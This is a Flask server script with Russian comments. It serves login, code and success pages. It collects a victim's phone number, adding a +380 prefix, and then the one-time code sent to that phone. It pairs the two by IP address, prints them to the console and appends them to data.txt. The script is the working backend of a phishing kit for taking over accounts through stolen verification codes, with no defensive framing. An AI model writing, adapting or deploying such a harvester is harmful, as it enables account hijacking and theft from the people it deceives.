from flask import Flask, render_template, request, Response

app = Flask(__name__)

# Словарь для хранения IP -> Номер телефона
phone_data = {}

@app.route('/')
def index():
    return render_template('Login.html')

@app.route('/code')
def code():
    return render_template('Code.html')

@app.route('/success')
def success():
    return render_template('Success.html')

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    phone = request.form.get('phone')
    if not phone:
        return Response("Номер телефона не указан", status=400)
    
    # Добавляем префикс +380, если его нет
    phone = phone.replace(" ", "")  # Убираем пробелы из формата
    if not phone.startswith('+'):
        phone = f"+380{phone}"
    
    # Получаем IP-адрес клиента
    client_ip = request.remote_addr
    
    # Сохраняем IP -> Номер телефона в словаре
    phone_data[client_ip] = phone
    
    # Выводим в консоль: IP -> Номер телефона
    print(f"{client_ip} -> {phone}")
    
    # Сохраняем в файл
    try:
        with open('data.txt', 'a', encoding='utf-8') as f:
            f.write(f"PHONE: {phone}\n")
        return render_template('Code.html')  # Перенаправляем на страницу кода
    except Exception as e:
        print(f"Ошибка при сохранении номера: {str(e)}")
        return Response(f"Ошибка при сохранении номера: {str(e)}", status=500)

@app.route('/submit_code', methods=['POST'])
def submit_code():
    code = request.form.get('code')
    if not code:
        return render_template('Code.html', error="Code is required.", previous_code="")
    
    # Получаем IP-адрес клиента
    client_ip = request.remote_addr
    
    # Ищем номер телефона по IP
    phone = phone_data.get(client_ip, "Неизвестный номер")
    
    # Выводим в консоль: Номер телефона -> Код
    print(f"{phone} -> {code}")
    
    # Сохраняем в файл
    try:
        with open('data.txt', 'a', encoding='utf-8') as f:
            f.write(f"CODE: {code}\n")
        return render_template('Success.html')  # Перенаправляем на страницу успеха
    except Exception as e:
        print(f"Ошибка при сохранении кода: {str(e)}")
        return render_template('Code.html', error=f"Error saving code: {str(e)}", previous_code=code)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=True)
